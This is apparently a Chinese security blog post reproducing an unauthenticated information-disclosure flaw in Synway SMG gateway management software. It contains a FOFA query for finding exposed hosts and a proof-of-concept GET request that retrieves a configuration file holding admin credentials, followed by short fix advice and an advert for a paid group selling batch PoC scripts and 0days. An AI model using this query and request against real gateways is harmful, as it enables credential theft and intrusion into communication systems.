#  「漏洞复现」三汇SMG网关管理软件 SMGSuperAdmin 信息泄露漏洞   
冷漠安全  冷漠安全   2024-12-10 12:13  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
三汇SMG网关管理软件是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。广泛应用于各种需要远程管理和优化网关设备的场景，如大容量IP呼叫中心、多分支机构通信、公安指挥系统等。在公安指挥系统中，该软件可以帮助公安部门实现各省厅、市局、分局、派出所之间的IP语音通信，提高内部通信信息的安全性和保密性。  
  
0x03  
  
漏洞威胁  
  
三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
app="Synway-网关管理软件"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVrSqGCt4UhJNbyuY3Mcwgiby1KD5ICANfoib3LPPz94DnXmbjMMvEiaibYjWRu8GsS2oVdGciatoZWQQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /Config/SMGSuperAdmin.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVrSqGCt4UhJNbyuY3McwgBbniaiaZ7Y4V7mayqwXy2gfmiaoG3CwBoh5hSRtxbYX3XfDgoy2AjPvxA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVrSqGCt4UhJNbyuY3McwgMR0uTX7H6ibqITvwECShXB0O9TMIcJ5uJrDq7bJWWuiaN4tQ8swaBr2Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问控制  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pVrSqGCt4UhJNbyuY3McwgjBloMyxCZwvyDjfbs5Jk1MfrO2KCgZ1VsXKMCZeyFbqebZ8yXaZliaQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pVrSqGCt4UhJNbyuY3McwgwPDR3DVFBLfw21qQI60qeTBJAQEZZ8GLzbeuBKkZEuwLsAvfcR4CSw/640?wx_fmt=gif&from=appmsg "")  
  
  
